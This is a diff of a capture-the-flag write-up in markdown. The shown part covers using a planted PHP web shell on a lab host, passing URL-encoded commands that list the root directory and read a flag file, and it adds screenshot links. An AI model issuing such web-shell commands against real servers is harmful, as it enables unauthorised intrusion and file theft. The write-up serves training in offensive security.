@@ -144,11 +144,14 @@ Given that we have write permissions, let write some malicious code on the serve
     - For exampe lets list the files in the root directory (make sure to URL encode your command)
     - Command: ls /
  
-https://154.57.164.78:32157/fSociety.php?0=ls%20/
+            https://154.57.164.78:32157/fSociety.php?0=ls%20/
 
+    <img width="1002" height="345" alt="rootDir" src="https://github.com/user-attachments/assets/31802144-6da0-4f87-ba53-1f730af57f4d" />
 
-https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt
+    - The file "flag_876a4c.txt", looks interesting, lets read it.
 
+            https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt
 
+    <img width="1002" height="345" alt="flag" src="https://github.com/user-attachments/assets/1d4b3426-376d-4dd4-acea-3dc415873d36" />
 
-- And with that, we've got the flag!
+    - And with that, we've got the flag!
